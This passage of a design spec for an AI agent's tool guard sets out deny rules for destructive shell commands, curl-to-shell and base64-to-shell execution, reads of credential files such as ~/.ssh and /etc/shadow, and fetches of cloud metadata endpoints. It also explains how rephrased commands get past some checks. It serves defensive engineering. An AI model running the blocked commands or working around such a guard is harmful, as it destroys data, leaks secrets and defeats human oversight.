5. **Word boundaries, no start/end anchoring for destructive patterns:** Destructive patterns must use `\b` or explicit delimiters for word-boundary matching (e.g., `rm` should not match `karma`). Destructive patterns must **not** use start-of-string (`^`) or end-of-string (`$`) anchors. Rationale: Phase A regex matching runs against the **full pipeline string** (pipes are not split in step 1 — see §4.2). A start-anchored pattern like `^git\s+reset\s+--hard` would fail to match `echo x | git reset --hard` because `git` does not appear at position 0 of the pipeline string. Using unanchored patterns with `\b` word boundaries (e.g., `\bgit\s+reset\s+--hard\b`) ensures the regex matches the dangerous command regardless of its position in a pipeline. Note: this constraint applies only to destructive patterns. Safe patterns **must** be start-anchored (`^`) per rule 1 — this is correct because safe pattern short-circuiting should not trigger on commands embedded in pipelines.
6. **Case sensitivity:** SQL patterns (database packs) must use case-insensitive matching (`(?i)`) since agent-generated SQL may use any casing. Non-SQL patterns are case-sensitive by default.
7. **Flag-order independence:** Patterns matching flag combinations (e.g., `rm` with `-r` and `-f`) must handle all orderings and combined forms: `rm -rf`, `rm -fr`, `rm -r -f`, `rm --recursive -f file`, `rm -r file -f`, etc. **Implementation:** For commands with complex flag semantics (especially `rm`), use the two-phase approach defined in §4.4: the `pattern` field contains a broad regex for the phase A candidate scan (e.g., `\brm\b`), and the `validator` field contains a function that tokenizes arguments and inspects the flag set for phase B. This avoids combinatorial regex complexity while remaining accurate. The `recursive_delete` and `recursive_delete_root` rules in `core.filesystem` use this hybrid approach.
8. **Exclusion logic for safe variants:** Destructive patterns that have safe flag variants must explicitly exclude them via **post-match validators** (not regex lookahead, which Rust's `regex` crate does not support). Example: the `force_push` rule uses a broad regex matching `git push` with `--force` or `-f`, and a validator that returns `false` (no match) when `--force-with-lease` is present. This ensures `git push --force-with-lease` is not blocked while `git push --force` is.
9. **Shared constant coupling:** When a safe pattern validator and a destructive rule both maintain lists of the same flags or tokens (e.g., the `find` safe validator and `find_destructive` both list dangerous `find` flags), both lists must reference shared `const` arrays so additions are made in one place. A `#[cfg(test)]` assertion must validate the expected set relationship (e.g., that the safe validator's flag set is a superset of the destructive rule's flag set). See the `find` coupling note in §3.3 for the detailed rationale and example.

### 6.3 Shell Core Packs

Core packs are always evaluated, even at `trustLevel: high`. They guard against the most dangerous and common destructive patterns.

#### 6.3.1 `core.filesystem`

Guards against recursive and forced file deletion, and dangerous moves/overwrites.

| Rule ID | Pattern (simplified) | Confidence | Reason | Suggestion |
|---------|---------------------|------------|--------|------------|
| `recursive_delete_root` | `rm` with `-r`/`-R` (with or without `-f`) targeting `/`, `~`, `/home`, or common system dirs (`/etc`, `/usr`, `/var`, `/boot`, `/bin`, `/sbin`, `/lib`) | High | Recursive deletion of root, home, or system directory | Specify the exact subdirectory to delete |
| `recursive_delete_force` | `rm` with `-r`/`-R`/`--recursive` and `-f`/`--force` flags (any order, including combined `-rf`, `-fr`) | High | Forced recursive deletion can destroy entire directory trees without confirmation | Delete specific files by name, or remove the `-f` flag and specify exact paths |
| `recursive_delete` | `rm` with `-r`/`-R`/`--recursive` (without `-f`) | Medium | Recursive deletion can destroy directory trees, but `rm -r` without `-f` is a common legitimate agent operation (removing build directories, cleaning temp files). Medium confidence allows this at `trustLevel: high` (warn only) while still blocking at medium trust. Confirmation prompts are not visible to agents, so `-f` absence provides no safety — but the prevalence of legitimate use justifies the downgrade from High | Delete specific files by name, or list directory contents first with `ls -la` |
| `find_destructive` | `find` with `-delete`, `-exec`, `-execdir`, `-ok`, or `-okdir` flags (detected via post-match validator using shlex tokenization — exact token match, not substring) | Medium | `find` with action flags can delete or execute arbitrary commands on matched files | Use `find` to list matching files first (`find . -name '*.tmp'`), review the output, then delete specific files by name |
| `mv_system_path` | `mv` targeting `/`, `/etc`, `/usr`, `/bin`, `/sbin`, `/lib`, `/boot`, `/home` as source or destination | Medium | Moving system directories can break the OS | Move specific files within subdirectories instead |
| `shred_device` | `shred` targeting block devices | High | Shredding devices causes permanent data loss | This operation should not be performed by an agent |
| `chmod_broad` | `chmod` with `-R`/`--recursive` targeting `/`, `/etc`, `/usr`, `/home`, or using `777`/`a+rwx` on any path | Medium | Recursive or overly permissive chmod can break system security | Set specific permissions on specific files (e.g., `chmod 644 file`) |
| `chown_recursive` | `chown` with `-R`/`--recursive` targeting `/`, `/etc`, `/usr`, `/home`, or system dirs | Medium | Recursive chown on system directories can break the OS | Change ownership of specific files only |
| `overwrite_truncate` | `>`, `>>`, or `truncate` targeting system files (`/etc/*`, `/boot/*`, etc.) | Medium | Overwriting or appending to system files can break the OS | Use `sudo tee` with explicit paths, or edit specific config files |
| `sensitive_read` | `cat`, `head`, `tail`, `less`, `more`, `strings`, or `xxd` targeting sensitive paths (`/etc/shadow`, `/etc/gshadow`, `/etc/sudoers`, `~/.ssh/*`, `~/.gnupg/*`, `~/.aws/*`, `~/.config/gcloud/*`, `*/.env`, `*/.netrc`) | Medium | Reading sensitive files (credentials, private keys, auth tokens) can leak secrets into the agent's context window, where they may be logged, transmitted, or included in generated output | Use targeted commands that don't expose raw secrets (e.g., `ssh-keygen -l -f ~/.ssh/id_rsa` to check a key fingerprint, `aws configure list` to check AWS config) |

**`overwrite_truncate` scope note:** This rule targets system paths only. Redirections to project files (e.g., `echo "test" > src/main.rs`) are considered normal agent operations and are not matched. Overwriting files outside the working directory but inside non-system paths (e.g., `> /tmp/data`) is also not matched. Broader redirect protection (e.g., outside-working-directory detection) is deferred as a future enhancement — it requires knowledge of the working directory, which the guard does not currently track.

**`overwrite_truncate` false positive note:** The `>` and `>>` operators are shell syntax, not commands — they can appear anywhere in a command string, including inside quoted arguments. The regex matches the operator followed by a system path (e.g., `>\s*/etc/`), which can false-positive when `>` appears as data in quoted strings (e.g., `grep ">" /etc/hosts` — though this particular example would not match because `>` is not followed by a system path). The regex cannot distinguish operator context from data context without full AST parsing (deferred as a future enhancement). The expected false-positive rate is low because: (1) the rule only triggers when `>` is followed by a system path, and (2) quoted `>` characters in arguments rarely precede system paths. False positives are safe — blocked commands can be rephrased (e.g., use `tee` instead of `>`).

#### 6.3.2 `core.git`

Guards against destructive git operations that lose history or modify remote state.

| Rule ID | Pattern (simplified) | Confidence | Reason | Suggestion |
|---------|---------------------|------------|--------|------------|
| `reset_hard` | `git reset --hard` | High | Discards all uncommitted changes permanently | Use `git stash` to save changes, or `git reset --soft` to unstage |
| `force_push` | `git push` with `--force`/`-f` (broad regex match, with post-match validator that excludes `--force-with-lease`) | High | Force push overwrites remote history, potentially losing others' work | Use `git push --force-with-lease` for safer force pushes |
| `clean_force` | `git clean -f` / `git clean -fd` | High | Permanently deletes untracked files/directories | Use `git clean -n` (dry run) first to preview what will be deleted |
| `checkout_discard` | `git checkout -- .` or `git checkout .` or `git checkout -- :/` or `git checkout -- <directory>` (broad discard; post-match validator checks that the path argument is `.`, `:/`, `*`, or a directory-like path ending in `/` — single-file paths like `git checkout -- file.txt` are not matched) | High | Discards uncommitted changes across a broad scope | Checkout specific files: `git checkout -- path/to/file` |
| `restore_discard` | `git restore .` or `git restore --staged .` or `git restore <directory>/` or `git restore -- *` (broad discard; post-match validator checks for `.`, `*`, or directory-like paths ending in `/`) | High | Discards uncommitted or staged changes across a broad scope | Restore specific files: `git restore path/to/file` |
| `rebase_active` | `git rebase` with `--onto` or `--root` (history surgery); post-match validator excludes `--abort`/`--continue`/`--skip` (recovery commands) | Medium | Rebase with `--onto` or `--root` rewrites commit history and can cause data loss | Use `git log` to review history first; simple `git rebase <branch>` is permitted |
| `branch_force_delete` | `git branch -D` / `git branch --delete --force` | Medium | Force-deletes a branch regardless of merge status | Use `git branch -d` which only deletes if fully merged |
| `stash_drop_clear` | `git stash drop` / `git stash clear` | Medium | Permanently deletes stashed changes | Verify stash contents with `git stash show` before dropping |
| `worktree_force_remove` | `git worktree remove --force` / `git worktree remove -f` | Medium | Force-removes a worktree without checking for uncommitted changes | Use `git worktree remove` without `--force` which checks for uncommitted changes first |
| `reflog_expire` | `git reflog expire` (with `--expire=now` or `--all`, detected via post-match validator) | High | Expiring reflog entries permanently destroys the ability to recover previous HEAD positions | Use `git reflog` to inspect entries before expiring; avoid `--expire=now` |
| `gc_prune` | `git gc` with `--prune=now` or `--prune=all` (detected via post-match validator; plain `git gc` without aggressive pruning is not matched) | Medium | Aggressive garbage collection permanently removes unreachable objects that could otherwise be recovered via reflog | Use `git gc` without `--prune=now` which uses a safe 2-week grace period |

#### 6.3.3 `core.obfuscation`

Guards against meta-execution patterns whose purpose in an agent context is guard bypass.

| Rule ID | Pattern (simplified) | Confidence | Reason | Suggestion |
|---------|---------------------|------------|--------|------------|
| `pipe_to_shell` | `... \| bash`/`sh`/`zsh`/etc. at end of pipeline | High | Piping content to a shell interpreter bypasses command inspection | Download/generate the script to a file, review it, then execute |
| `base64_to_shell` | `base64 -d` piped to `bash`/`sh`/`eval` | High | Base64-encoded commands bypass pattern matching | Write the command directly instead of encoding it |
| `eval_subshell` | `eval $(...)` or `eval \`...\`` | High | eval of dynamic content bypasses command inspection | Execute the inner command directly |
| `curl_pipe_shell` | `curl`/`wget` piped to `bash`/`sh`/`eval` | High | Downloading and executing untrusted code in one step | Download the script first with `curl -o script.sh`, review it, then execute |
| `python_exec` | `python`/`python3` `-c` with `os.system(...)`, `os.popen(...)`, `os.exec*` variants (`os.execl`, `os.execle`, `os.execlp`, `os.execlpe`, `os.execv`, `os.execve`, `os.execvp`, `os.execvpe`), `subprocess.run(...)`, `subprocess.call(...)`, or `subprocess.Popen(...)` | Medium | Python used as a shell wrapper to bypass command inspection | Execute the shell command directly |

**`python_exec` false positive note:** This rule may produce false positives for legitimate Python one-liners that use `subprocess.run` with safe commands (e.g., `python3 -c "import subprocess; subprocess.run(['ls', '-la'])"`). Medium confidence ensures these are downgraded to Warn at `trustLevel: high`. The rule is intentionally broad — Python's shell dispatch functions are a common agent bypass vector, and false positives (blocked commands can be rephrased as direct shell commands) are safer than false negatives.

#### 6.3.4 `core.stencila`

Guards the agent's own runtime, credentials, and publishing operations.

| Rule ID | Pattern (simplified) | Confidence | Reason | Suggestion |
|---------|---------------------|------------|--------|------------|
| `secrets_modify` | `stencila secrets set`/`delete`/`remove` | High | Modifying secrets can break authentication | Use `stencila secrets list` to view secrets |
| `auth_modify` | `stencila auth login`/`logout` | High | Changing authentication state affects all sessions | Use `stencila auth status` to check auth state |
| `cloud_auth` | `stencila cloud signin`/`signout` | High | Changing cloud authentication affects deployments | Use `stencila cloud status` to check cloud state |
| `publish` | `stencila publish` | High | Publishing makes content publicly visible | Review content manually before publishing |
| `uninstall` | `stencila uninstall` | High | Uninstalling removes the runtime | This operation should not be performed by an agent |
| `push` | `stencila push` | Medium | Pushing sends local changes to remote | Use `stencila status` to review changes first |
| `db_destructive` | `stencila db reset`/`gc` | Medium | Database reset/gc can lose data | Use `stencila db status` to inspect the database first |
| `clean` | `stencila clean` | Medium | Clean removes generated artifacts | Use `stencila status` to see what will be removed |

**Safe patterns at medium/high trust:** The safe-pattern catalog (§3.3) includes several read-only `stencila` commands (`stencila secrets list`, `stencila status`, etc.) for `low` trust. At `medium`/`high` trust (default-allow), these safe patterns are redundant — unmatched `stencila` subcommands are allowed by default after passing step 3's destructive check. Non-destructive subcommands like `stencila render` or `stencila convert` are implicitly allowed at medium/high trust, which is the intended behavior.

### 6.4 Shell Extended Packs

Extended packs are evaluated at all trust levels. They cover domain-specific destructive commands beyond the core filesystem/git/stencila scope.

#### 6.4.1 `database.postgresql`

| Rule ID | Pattern (simplified) | Confidence | Reason | Suggestion |
|---------|---------------------|------------|--------|------------|
| `drop_database` | `DROP DATABASE` (via `psql -c` or inline SQL) | High | Permanently destroys the entire database | Use `pg_dump` to backup first |
| `drop_table` | `DROP TABLE` (any form, including `IF EXISTS`) | High | Permanently destroys a table and all its data | Use `pg_dump -t <table>` to backup first; use a transaction with `BEGIN`/`ROLLBACK` for safety |
| `truncate` | `TRUNCATE TABLE` | Medium | Removes all rows without logging individual deletions | Use `DELETE FROM` with a `WHERE` clause for selective deletion |
| `delete_no_where` | `DELETE FROM` without `WHERE` clause | Medium | Deletes all rows from a table | Add a `WHERE` clause to limit deletion scope. If your query already has a WHERE clause on a separate line, combine them onto one line (e.g., `DELETE FROM users WHERE active = false`) |

**`delete_no_where` false positive note (applies to all database packs):** Multi-line SQL can produce false positives. A query like `DELETE FROM users\nWHERE active = false` is split by step 1 on `\n`, yielding `DELETE FROM users` as a segment — which matches `delete_no_where` even though the original query has a `WHERE` clause. This is an accepted false positive: the guard is a friction layer, and the agent can rephrase the query onto a single line (e.g., `DELETE FROM users WHERE active = false`). The denial message's suggestion ("Add a `WHERE` clause") naturally guides the agent to produce a single-line variant that passes.

#### 6.4.2 `database.mysql`

| Rule ID | Pattern (simplified) | Confidence | Reason | Suggestion |
|---------|---------------------|------------|--------|------------|
| `drop_database` | `DROP DATABASE` / `DROP SCHEMA` | High | Permanently destroys the entire database | Use `mysqldump` to backup first |
| `drop_table` | `DROP TABLE` | High | Permanently destroys a table and all its data | Backup the table first with `mysqldump` |
| `truncate` | `TRUNCATE TABLE` | Medium | Removes all rows without logging | Use `DELETE FROM` with a `WHERE` clause |
| `delete_no_where` | `DELETE FROM` without `WHERE` | Medium | Deletes all rows from a table | Add a `WHERE` clause. If your query already has a WHERE clause on a separate line, combine onto one line |

#### 6.4.3 `database.sqlite`

| Rule ID | Pattern (simplified) | Confidence | Reason | Suggestion |
|---------|---------------------|------------|--------|------------|
| `drop_table` | `DROP TABLE` | High | Permanently destroys a table | Backup the database file first |
| `delete_no_where` | `DELETE FROM` without `WHERE` | Medium | Deletes all rows from a table | Add a `WHERE` clause. If your query already has a WHERE clause on a separate line, combine onto one line |

**Database pack implementation note:** The `DROP TABLE`, `TRUNCATE TABLE`, and `DELETE FROM` patterns are syntactically identical across PostgreSQL, MySQL, and SQLite. The per-database pack separation is retained for organizational clarity (each pack has its own suggestion text referencing the appropriate backup tool — `pg_dump`, `mysqldump`, file copy) and to allow future database-specific rules. However, the shared SQL patterns (e.g., `(?i)\bDROP\s+TABLE\b`) should be defined as shared constants referenced by all three packs to reduce maintenance burden.

#### 6.4.4 `containers.docker`

| Rule ID | Pattern (simplified) | Confidence | Reason | Suggestion |
|---------|---------------------|------------|--------|------------|
| `system_prune` | `docker system prune` | High | Removes all unused containers, networks, images, and optionally volumes | Use `docker container prune` or `docker image prune` for targeted cleanup |
| `volume_prune` | `docker volume prune` | High | Permanently deletes all unused volumes and their data | List volumes with `docker volume ls` and remove specific ones |
| `force_remove` | `docker rm -f` / `docker rmi -f` on multiple targets or wildcards | Medium | Force-removes running containers or in-use images | Stop containers first with `docker stop`, then remove |

#### 6.4.5 `kubernetes.kubectl`

| Rule ID | Pattern (simplified) | Confidence | Reason | Suggestion |
|---------|---------------------|------------|--------|------------|
| `delete_namespace` | `kubectl delete namespace`/`ns` | High | Deletes all resources in the namespace | Delete specific resources within the namespace instead |
| `delete_all` | `kubectl delete` with `--all` or `--all-namespaces` | High | Mass-deletes resources across scopes | Delete specific resources by name |
| `drain_node` | `kubectl drain` without `--dry-run` | Medium | Evicts all pods from a node | Use `kubectl drain --dry-run=client` first to preview |

#### 6.4.6 `cloud.aws`

| Rule ID | Pattern (simplified) | Confidence | Reason | Suggestion |
|---------|---------------------|------------|--------|------------|
| `terminate_instances` | `aws ec2 terminate-instances` | High | Permanently destroys EC2 instances | Use `aws ec2 stop-instances` to stop without terminating |
| `delete_db` | `aws rds delete-db-instance` / `delete-db-cluster` | High | Permanently deletes database instances | Create a final snapshot first with `--final-db-snapshot-identifier` |
| `s3_recursive_delete` | `aws s3 rm --recursive` / `aws s3 rb --force` (note: `aws s3 rb` without `--force` only removes empty buckets and is not matched) | High | Recursively deletes S3 objects or force-removes buckets | Use `aws s3 ls` to inspect first; delete specific prefixes |
| `iam_delete` | `aws iam delete-user` / `delete-role` / `delete-policy` | Medium | Removes IAM identities and their permissions | Use `aws iam list-*` to review before deletion |

#### 6.4.7 `cloud.iac`

| Rule ID | Pattern (simplified) | Confidence | Reason | Suggestion |
|---------|---------------------|------------|--------|------------|
| `terraform_destroy` | `terraform destroy` / `terraform apply -destroy` | High | Destroys all managed infrastructure resources | Use `terraform plan -destroy` to preview what will be destroyed |
| `pulumi_destroy` | `pulumi destroy` | High | Destroys all managed infrastructure resources | Use `pulumi preview --diff` to review changes first |

#### 6.4.8 `system.disk`

| Rule ID | Pattern (simplified) | Confidence | Reason | Suggestion |
|---------|---------------------|------------|--------|------------|
| `dd_to_device` | `dd` with `of=/dev/...` | High | Writing directly to devices can destroy partitions and data | Specify a file path instead of a device |
| `mkfs` | `mkfs` / `mkfs.*` targeting a device | High | Formatting a device destroys all data on it | Verify the target device with `lsblk` first |
| `fdisk_parted` | `fdisk` / `parted` / `gdisk` in non-print mode | Medium | Partition changes can cause data loss | Use `fdisk -l` or `parted print` to inspect first |

#### 6.4.9 `packages.registries`

Guards against destructive package manager operations that affect public registries or local cache.

| Rule ID | Pattern (simplified) | Confidence | Reason | Suggestion |
|---------|---------------------|------------|--------|------------|
| `npm_unpublish` | `npm unpublish` / `yarn npm unpublish` / `pnpm unpublish` | High | Unpublishing removes a package version from the public registry, potentially breaking dependents | Use `npm deprecate` to mark versions as deprecated instead |
| `npm_deprecate` | `npm deprecate` / `pnpm deprecate` | Medium | Deprecating a package version affects all consumers | Verify the package name and version before deprecating |
| `npm_cache_clean` | `npm cache clean --force` / `yarn cache clean` / `pnpm store prune` | Medium | Removes the local package cache, requiring full re-download | Use `npm cache verify` to check cache integrity instead |
| `cargo_publish` | `cargo publish` | High | Publishing a crate to crates.io is a public, irreversible action — published versions cannot be fully removed | Verify package metadata with `cargo package --list` first; ensure version and contents are correct |
| `npm_publish` | `npm publish` / `yarn publish` / `pnpm publish` | High | Publishing a package to a registry is a public, irreversible action | Verify package contents with `npm pack --dry-run` first; ensure version and contents are correct |

### 6.5 Shared Path Lists

```rust
// System read paths: virtual/device filesystems whose contents should not
// be read by agents. Intentionally narrower than SYSTEM_WRITE_PATHS —
// reading most system files (e.g., /etc/hosts, /usr/share/doc/) is useful
// for agents, while /proc, /sys, and /dev expose kernel state, process
// internals (including credentials via /proc/self/environ), and raw devices.
// Paths like /etc/shadow are covered separately by SENSITIVE_PATHS.
pub const SYSTEM_READ_PATHS: &[&str] = &[
    "/proc/", "/sys/", "/dev/",
];

// Read-sensitive paths: credential and key files whose contents should not
// be exposed in the agent's context window (risk: secret leakage).
pub const SENSITIVE_PATHS: &[&str] = &[
    "/etc/shadow", "/etc/gshadow", "/etc/sudoers",
    "~/.ssh/", "~/.gnupg/", "~/.aws/", "~/.config/gcloud/",
    ".env", ".netrc",
];

// Write-sensitive paths: a superset of read-sensitive paths, plus shell
// startup files (~/.bashrc, ~/.zshrc, etc.). Reading these is harmless, but
// writing to them is a persistence vector — a compromised agent could inject
// commands that execute on every future shell login. This asymmetry between
// the read and write lists is intentional.
pub const SENSITIVE_WRITE_PATHS: &[&str] = &[
    "~/.ssh/", "~/.gnupg/", "~/.aws/", "~/.config/gcloud/",
    ".env", ".netrc",
    "~/.bashrc", "~/.bash_profile", "~/.profile",
    "~/.zshrc", "~/.zprofile",
];

pub const SYSTEM_WRITE_PATHS: &[&str] = &[
    "/etc/", "/usr/", "/boot/", "/sbin/", "/bin/", "/lib/",
    "/proc/", "/sys/", "/dev/",
];

pub const PROTECTED_DIR_COMPONENTS: &[&str] = &[".git"];
```

#### 6.5.1 Path Matching Modes

Entries in the shared path lists use three distinct matching modes, determined by their syntactic form. All matching is performed against the **normalized absolute path** produced by the file guard's normalization pipeline (§4.7: resolve `~` to home directory, resolve `..`, resolve relative paths against working directory).

| Form | Matching Mode | Rule | Examples |
|------|--------------|------|----------|
| Absolute path without trailing `/` (e.g., `/etc/shadow`) | **Exact match** | Normalized path must equal the entry exactly. | `/etc/shadow` ✓ matches `/etc/shadow`; `/etc/shadow.bak` ✗ does not match. |
| Path with trailing `/` (e.g., `~/.ssh/`, `/etc/`) | **Prefix match** | Normalized path must start with the expanded entry (after `~` expansion). The trailing `/` ensures directory-level matching. | `~/.ssh/id_rsa` ✓ matches `~/.ssh/`; `~/.sshconfig` ✗ does not match (no `/` after `.ssh`). |
| Bare filename without `/` (e.g., `.env`, `.netrc`) | **Basename match** | The last component of the normalized path must equal the entry exactly. This matches the file regardless of its directory location. | `/home/user/project/.env` ✓ matches; `/home/user/project/subdir/.env` ✓ matches; `/home/user/.environment` ✗ does not match. |

**`~` expansion:** Entries starting with `~/` are expanded to the user's home directory before comparison. After expansion, they follow the rules above (prefix match if trailing `/`, exact match otherwise). For example, `~/.bashrc` expands to `/home/user/.bashrc` and uses exact match; `~/.ssh/` expands to `/home/user/.ssh/` and uses prefix match.

**`SYSTEM_READ_PATHS` vs `SYSTEM_WRITE_PATHS` note:** `SYSTEM_READ_PATHS` is intentionally narrower than `SYSTEM_WRITE_PATHS` — reading `/etc/hosts` or `/usr/share/doc/` is common and useful for agents, while reading `/proc/`, `/sys/`, and `/dev/` exposes kernel state and process internals. Writing to any system path is blocked because even benign-looking writes (e.g., `/etc/hosts`) can break OS configuration. All entries in both lists have trailing `/`, so they use prefix matching. `/etc/hosts` matches `SYSTEM_WRITE_PATHS` entry `/etc/` but does **not** match any `SYSTEM_READ_PATHS` entry. `/etcetera` does not match either list because there is no `/` after `/etc`.

`protected_file_overwrite` checks whether any normalized path component is exactly equal to an entry in `PROTECTED_DIR_COMPONENTS`. Matching is component-based, not raw-string-prefix based. The list currently contains only `.git`; additional VCS directories (e.g., `.hg`, `.svn`) can be added in future versions without changing the matching logic.

### 6.6 File Guard Rules

**Verdict mapping note:** File and web guard rules use **explicit per-trust-level verdicts** defined in the tables below — they do **not** use the shell confidence→verdict mapping from §4.4. The "Severity" column in file/web tables is informational only (documenting the rule's inherent risk level for audit and documentation purposes) and is deliberately named differently from the shell guard's "Confidence" enum (§6.1) to avoid confusion — shell confidence drives verdict derivation via §4.4, while file/web severity does not. Implementers must use the explicit `low`/`medium`/`high` verdict columns, not derive verdicts from the severity label.

#### 6.6.1 Read Rules

| Rule ID | Condition | Severity | `low` | `medium` | `high` | Reason | Suggestion |
|---------|-----------|----------|-------|----------|--------|--------|------------|
| `file.system_path_read` | Path under `SYSTEM_READ_PATHS` (`/proc/`, `/sys/`, `/dev/`) | High | Deny | Deny | Deny | Reading virtual/device filesystem paths can expose kernel state, process internals, and credentials (e.g., `/proc/self/environ`) | Use specific inspection commands instead (e.g., `uname` for system info, `env` for environment) |
| `file.sensitive_path_read` | Path in `SENSITIVE_PATHS` (`~/.ssh/*`, `~/.aws/*`, `/etc/shadow`, etc.) | Medium | Deny | Deny | Warn | Reading credential and key files can leak secrets into the agent's context window | Use targeted commands that don't expose raw secrets (e.g., `ssh-keygen -l -f` to check a key fingerprint) |
| `file.outside_workspace_read` | Normalized path outside session workspace root | Medium | Deny | Warn | Allow | Read target is outside the session workspace root | Verify the path is intended, or copy the file into the workspace first |

#### 6.6.2 Write Rules

| Rule ID | Condition | Severity | `low` | `medium` | `high` | Reason | Suggestion |
|---------|-----------|----------|-------|----------|--------|--------|------------|
| `file.system_path_write` | Path under `SYSTEM_WRITE_PATHS` | High | Deny | Deny | Deny | Writing to system paths can break OS configuration and stability | Use application-level config files in the project directory instead |
| `file.sensitive_path_write` | Path in `SENSITIVE_WRITE_PATHS` (includes shell rc files) | High | Deny | Deny | Deny | Writing to credential files or shell startup files is a persistence and credential-tampering vector | Modify project-local configuration instead of user-level dotfiles |
| `file.outside_workspace_write` | Write target outside session workspace root | High | Deny | Warn | Allow | Write target is outside the session workspace root | Write to a path within the project workspace, or verify the target path is intended |
| `file.protected_file_overwrite` | Any write target under `.git/` tree | Medium | Deny | Deny | Warn | Writing to `.git/` internals can corrupt repository state | Edit hooks or config via `git config` or manual review outside the agent |
| `file.apply_patch_delete_many` | `apply_patch` has >= 5 `DeleteFile` ops | Medium | Deny | Warn | Warn | Bulk file deletion in a single patch may indicate a hallucinated cleanup | Break the patch into smaller steps deleting fewer than 5 files each, or verify the file list is correct |

**`apply_patch_delete_many` threshold rationale:** The threshold of 5 is based on observed agent behavior: legitimate refactoring patches rarely delete more than 3–4 files in a single `apply_patch` call, while hallucinated "clean up" patches sometimes attempt to delete dozens. The value 5 provides a margin above normal usage while catching bulk-delete mistakes. The threshold is a compiled constant and can be adjusted in future versions based on production telemetry.

`apply_patch` evaluation is multi-target: strictest verdict across all extracted paths wins. `UpdateFile.move_to` must be evaluated as a write target.

### 6.7 Web Guard Rules

| Rule ID | Condition | Severity | `low` | `medium` | `high` | Reason | Suggestion |
|---------|-----------|----------|-------|----------|--------|--------|------------|
| `web.credential_url` | Metadata host + credential path (see `CREDENTIAL_PATH_PREFIXES` in §4.8) | High | Deny | Deny | Deny | Metadata credential paths return IAM tokens and secrets that can be used for privilege escalation | Use the cloud provider's CLI for credential management (e.g., `aws sts get-caller-identity`) |
| `web.metadata_endpoint` | Host is cloud metadata endpoint (see `METADATA_HOSTS` in §4.8) | High | Deny | Deny | Deny | Cloud metadata endpoints expose instance credentials and configuration | Access cloud credentials through the provider's CLI or SDK instead |
| `web.internal_network` | Host is localhost, private/loopback IP, `*.local`, `*.internal` | High | Deny | Deny | Deny | Fetching internal network addresses can expose services not meant for external access (SSRF) | Use a public URL, or access internal services through an appropriate API |
| `web.non_https` | Scheme is `http` | Medium | Deny | Warn | Allow | Unencrypted HTTP requests can expose data in transit | Use `https://` instead of `http://` |
| `web.high_risk_port` | Port in high-risk set (see list below) | Medium | Deny | Warn | Allow | Port is associated with an infrastructure service not typically accessed via HTTP | Use the service's dedicated CLI or client library instead of HTTP |
| `web.domain_allowlist` | `allowedDomains` set and host does not match | High | Deny | Deny | Deny | Domain is not in the agent's allowed domain list | Add the domain to `allowedDomains` in the agent definition, or use an allowed domain |
| `web.domain_denylist` | `disallowedDomains` set and host matches | High | Deny | Deny | Deny | Domain is in the agent's disallowed domain list | Remove the domain from `disallowedDomains` if access is intended, or use a different source |

**`web.high_risk_port` port list:**

```rust
pub const HIGH_RISK_PORTS: &[u16] = &[
    22,    // SSH
    23,    // Telnet
    25,    // SMTP
    135,   // MS RPC
    139,   // NetBIOS
    445,   // SMB
    2375,  // Docker daemon (unencrypted)
    2376,  // Docker daemon (TLS)
    3306,  // MySQL
    5432,  // PostgreSQL
    5900,  // VNC
    6379,  // Redis
    6443,  // Kubernetes API
    8500,  // Consul
    8200,  // Vault
    9200,  // Elasticsearch
    27017, // MongoDB
];
```

Built-in rule order is normative (most-specific-first): `credential_url` -> `metadata_endpoint` -> `internal_network` -> `non_https` -> `high_risk_port`.

---

## 7. Verdicts

### 7.1 Verdict Types

```rust
pub enum GuardVerdict {
    Allow,
    Warn {
        reason: &'static str,
        suggestion: &'static str,
        rule_id: &'static str,
    },
    Deny {
        reason: &'static str,
        suggestion: &'static str,
        rule_id: &'static str,
    },
}
```

`rule_id` is required for all `Warn`/`Deny` verdicts and uses composite dotted IDs:
- Shell: `shell.{pack_id}.{rule}` (e.g. `shell.core.git.force_push`) — note that `pack_id` itself contains a dot (e.g., `core.git`, `core.filesystem`), so shell rule IDs have four dot-separated segments. Do not parse on `.` to extract components; use the known prefixes `shell.`, `file.`, `web.` to identify the guard domain.
- File: `file.{rule}` (e.g. `file.sensitive_path_write`)
- Web: `web.{rule}` (e.g. `web.internal_network`)

### 7.2 Verdict Delivery

- `Deny`: return tool output text (not error), including `rule_id`, `reason`, and `suggestion`.
- `Warn`: allow execution, append a brief warning note to output, and audit log.
- `Allow`: execute normally; no audit event.

---

## 8. Integration

### 8.1 Top-Level Guard

```rust
pub struct ToolGuard {
    pub trust_level: TrustLevel,
    shell_guard: ShellToolGuard,
    file_guard: FileToolGuard,
    web_guard: WebToolGuard,
    audit_tx: Option<mpsc::Sender<AuditEvent>>,
}

pub struct GuardContext {
    pub session_id: Arc<str>,
    pub agent_name: Arc<str>,
}
```

`ToolGuard::evaluate(context, tool_name, args, working_dir)` dispatches to the appropriate guard implementation and returns `GuardVerdict`.

### 8.2 Per-Executor Injection

Guarded tools expose:

```rust
pub fn executor_with_guard(
    guard: Option<Arc<ToolGuard>>,
    context: Option<Arc<GuardContext>>,
) -> ToolExecutorFn
```

Shell additionally exposes:

```rust
pub fn executor_with_guard_and_timeout(
    guard: Option<Arc<ToolGuard>>,
    context: Option<Arc<GuardContext>>,
    default_timeout_ms: u64,
    max_timeout_ms: u64,
) -> ToolExecutorFn
```

Provider profiles and registration helpers must thread both `guard` and `context` into guarded executors. `glob` and `list_dir` remain unguarded in the current scope.

This wiring is required at both helper and provider-constructor layers. Updating `register_*_tools` alone is insufficient because provider profiles currently register many tools inline. `AnthropicProfile::new`, `OpenAiProfile::new`, and `GeminiProfile::new` must accept `Option<Arc<ToolGuard>>` + `Option<Arc<GuardContext>>` and switch guarded tools from `foo::executor()` to `foo::executor_with_guard(guard.clone(), context.clone())` (and shell to `executor_with_guard_and_timeout(...)`) so enforcement is active at runtime.

### 8.3 Session and Subagent Propagation

- `ToolGuard` policy object is shared by `Arc` across parent and child sessions.
- Each session (parent and child) constructs its own `GuardContext` for correct audit attribution.
- Workspace root for `outside_workspace_*` checks is fixed at parent-session guard construction.
- Child `AGENT.md` trust/domain settings do not override an inherited parent guard. If a child agent declares a `trustLevel` that differs from the inherited guard's level, the implementation should emit an info-level event (e.g., "Child agent 'foo' declares trustLevel: high but inherits parent guard at medium — parent guard takes precedence"). This aids debugging without changing enforcement behavior.

---

## 9. Database Audit

### 9.1 Migration

Domain: `"tool_guard"`

```sql
CREATE TABLE IF NOT EXISTS tool_guard_events (
    id               INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp        TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
